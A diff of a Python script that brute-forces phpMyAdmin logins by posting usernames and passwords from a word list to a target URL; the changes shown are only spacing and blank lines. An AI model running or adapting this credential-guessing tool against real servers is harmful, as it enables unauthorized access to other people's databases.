@@ -14,7 +14,7 @@ def req(url,username,password):
     payload = {
         'pma_username':'{}'.format(username),
         'pma_password':'{}'.format(password),
-        'server':'1',
+        'server': '1',
     }
     res = requests.post(url,data=payload,headers=headers)
     return res
@@ -22,9 +22,9 @@ def req(url,username,password):
 def option():
     usage = '%prog -h | --help'
     parser = optparse.OptionParser(usage = usage)
-    parser.add_option("--url",dest="url",help="target url  usage: -url http://www.xxx.com/phpmyadmin")
-    parser.add_option("--user",dest="username",help="username   usage: --user root")
-    parser.add_option("--pass",dest="password",help="password path   usage: --pass /sqlsec/password.txt")
+    parser.add_option("--url", dest="url",help="target url  usage: -url http://www.xxx.com/phpmyadmin")
+    parser.add_option("--user", dest="username",help="username   usage: --user root")
+    parser.add_option("--pass", dest="password",help="password path   usage: --pass /sqlsec/password.txt")
     (options, args) = parser.parse_args()
     return parser,options
 
@@ -32,7 +32,7 @@ def main():
     flag = False
     parser,args = option()
     if args.password:
-        f = open(args.password,"r") 
+        f = open(args.password, "r")
         lines = f.readlines()      #读取全部内容 ，并以列表方式返
         p = progressbar.ProgressBar()
         print(Fore.RED + "attacking....")
@@ -53,5 +53,7 @@ def main():
                 parser.print_help()
         if not flag:
             print(Fore.RED + "[*] PHPMyAdmin is not vulerable")
+
+
 if __name__ == '__main__':
     main()
